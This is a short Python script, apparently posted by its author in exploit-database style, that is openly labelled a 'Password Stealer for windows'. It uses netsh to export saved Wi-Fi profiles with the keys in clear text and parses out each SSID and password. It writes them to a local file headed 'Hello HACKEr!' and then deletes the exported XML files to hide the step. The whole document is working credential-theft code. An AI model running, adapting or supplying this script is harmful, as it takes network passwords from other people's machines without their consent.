# Program name : Password Stealer for windows
# Date: 25-03-2023
# Author: Lucky Ngabuh @cyber30
# Vendor Homepage: https://cyberthirty.github.io
# Software Link: github.com/cyberthirty
# Version: 1.0.0
# Tested on: Windows 10
# Description : It's the python program that steal stored wifi credential and save to a file

import subprocess
import os
import sys

#create a file
passwdFile = open("passwdFile.txt", "w")
passwdFile.write("Hello HACKEr!, Here is a stolen credential : \n\n")
passwdFile.close()

#list 
wifiFile = []
SSIDname = []
keyContent = []

#export saves profile
#execute this windows command netsh wlan export profile key=clear by subprocess module
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True)
cmd = command.stdout.decode()

#current directory
directory = os.getcwd()

#loop
for file in os.listdir(directory):
	if file.startswith("Wi-Fi") and file.endswith(".xml"):
		wifiFile.append(file)
		
		for i in wifiFile:
			
			with open(i, "r") as f:

				for line in f.readlines():
					if 'name' in line:
						stripName = line.strip()
						frontName = stripName[6: ]
						backName = frontName[ :-7]
						SSIDname.append(backName)

					if 'keyMaterial' in line:
						stripKey = line.strip()
						frontKey = stripKey[13: ]
						backKey = frontKey[ :-14]
						keyContent.append(backKey)

						for ssidName, keycontent in zip(SSIDname, keyContent):
							sys.stdout = open("passwdFile.txt", "a")
							print("SSID Name : " + ssidName, "Password : " + keycontent, sep = '\n')
							sys.stdout.close()

			# delete *.xml
			os.remove(i)